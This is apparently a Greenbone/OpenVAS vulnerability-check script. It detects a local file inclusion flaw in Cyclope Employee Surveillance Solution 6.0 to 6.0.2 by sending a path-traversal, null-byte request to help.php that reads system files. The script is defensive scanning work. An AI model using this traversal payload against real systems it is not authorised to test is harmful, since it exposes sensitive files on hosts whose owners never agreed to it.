if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802934" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-08-16 12:28:45 +0530 (Thu, 16 Aug 2012)" );
	script_name( "Cyclope Employee Surveillance Solution Local File Inclusion Vulnerability" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/20545/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/115590/cyclopees-sqllfi.txt" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_require_ports( "Services/www", 7879 );
	script_dependencies( "find_service.sc", "httpver.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to obtain potentially
  sensitive information." );
	script_tag( name: "affected", value: "Cyclope Employee Surveillance Solution versions 6.0 to 6.0.2." );
	script_tag( name: "insight", value: "An improper validation of user-supplied input via the 'pag'
  parameter to 'help.php', that allows remote attackers to view files and execute
  local scripts in the context of the webserver." );
	script_tag( name: "solution", value: "Update to version 6.2.1 or later." );
	script_tag( name: "summary", value: "This host is running Cyclope Employee Surveillance Solution and
  is prone to local file inclusion vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 7879 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
sndReq = http_get( item: "/activate.php", port: port );
rcvRes = http_send_recv( port: port, data: sndReq );
if(rcvRes && IsMatchRegexp( rcvRes, "HTTP/1.. 200" ) && ContainsString( rcvRes, "<title>Cyclope" ) && ContainsString( rcvRes, "Cyclope Employee Surveillance Solution" )){
	files = traversal_files();
	for file in keys( files ) {
		url = "/help.php?pag=../../../../../../" + files[file] + "%00";
		if(http_vuln_check( port: port, url: url, pattern: file, extra_check: make_list( "Cyclope Employee" ) )){
			security_message( port: port );
			exit( 0 );
		}
	}
}

